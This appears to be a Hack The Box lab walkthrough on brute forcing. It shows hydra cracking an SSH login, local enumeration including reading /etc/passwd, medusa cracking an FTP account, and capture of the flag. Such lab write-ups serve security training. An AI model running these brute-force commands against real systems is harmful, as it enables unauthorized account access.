This is the second part of the skills assessment.`YOU NEED TO COMPLETE THE FIRST PART BEFORE STARTING THIS`. Use the username you were given when you completed part 1 of the skills assessment to brute force the login on the target instance.

![Pasted image 20250213160519.png](../../../../IMAGES/Pasted%20image%2020250213160519.png)

If we recall last part, we found an username:

```
satwossh
```

We can begin our brute forcing by trying to find the password for that username, we suppose its a `ssh` user so, let's do the following command:

```
hydra -l satwossh -P 2023-200_most_used_passwords.txt 94.237.54.164 -s 36513 ssh -t 60
```

We get the following:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-13 21:06:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 60 tasks per 1 server, overall 60 tasks, 200 login tries (l:1/p:200), ~4 tries per task
[DATA] attacking ssh://94.237.54.164:36513/
[36513][ssh] host: 94.237.54.164 login: satwossh password: password1
1 of 1 target successfully completed, 1 valid password found
```

Found credentials:

```
`satwossh`:`password1`
```

Let's log into ssh:

```
ssh satwossh@94.237.54.164 -p 36513
The authenticity of host '[94.237.54.164]:36513 ([94.237.54.164]:36513)' can't be established.
ED25519 key fingerprint is SHA256:0ldLAJLTwIrE2wupFhvN1WiHuimct7AF+pBddY5xIi8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[94.237.54.164]:36513' (ED25519) to the list of known hosts.
satwossh@94.237.54.164's password:
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.1.0-10-amd64 x86_64)

 * Documentation: https://help.ubuntu.com
 * Management: https://landscape.canonical.com
 * Support: https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
satwossh@ng-1340293-loginbfsatwo-rv3cd-7fdfc99595-9tpzv:~$
```

Nice, let's search the ports and active listening services, also, the home directory:

```
 netstat -tulpn | grep LISTEN
(No info could be read for "-p": geteuid()=1000 but you should be root.)
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - 
tcp6 0 0 :::21 :::* LISTEN - 
tcp6 0 0 :::22 :::* LISTEN -


nmap localhost
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-13 21:09 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000076s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 998 closed ports
PORT STATE SERVICE
21/tcp open ftp
22/tcp open ssh

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
ftp:x:105:107:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
satwossh:x:1000:1000::/home/satwossh:/bin/bash
thomas:x:1001:1001::/var/.hidden:/bin/bash
```

We found ftp, and an user named `thomas`, let's try to brute force the ftp login:

```
which medusa

/usr/bin/medusa
```

Medusa is enabled:

```
medusa -h 127.0.0.1 -u thomas -P passwords.txt -M ftp -t 5

ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: thomas (1 of 1, 0 complete) Password: a123456 (28 of 198 complete)
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: thomas (1 of 1, 0 complete) Password: 666666 (29 of 198 complete)
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: thomas (1 of 1, 0 complete) Password: asdfghjkl (30 of 198 complete)
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: thomas (1 of 1, 0 complete) Password: ashley (31 of 198 complete)
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: thomas (1 of 1, 0 complete) Password: chocolate! (32 of 198 complete)
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: thomas Password: chocolate! [SUCCESS]
```

Found the ftp credentials:

```
`thomas`:`chocolate!`
```

Let's log into ftp:

```
ftp ftp://thomas:'chocolate!'@localhost

Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||55297|)
150 Here comes the directory listing.
-rw------- 1 1001 1001 28 Sep 10 09:19 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||10266|)
150 Opening BINARY mode data connection for flag.txt (28 bytes).
100% |***********************************************************************************************************************************************************| 28 701.12 KiB/s 00:00 ETA
226 Transfer complete.
28 bytes received in 00:00 (157.14 KiB/s)
ftp> exit
221 Goodbye.

cat flag.txt

HTB{brut3f0rc1ng_succ3ssful}
```

Flag is:

```
HTB{brut3f0rc1ng_succ3ssful}
```


![Pasted image 20250213161640.png](../../../../IMAGES/Pasted%20image%2020250213161640.png)

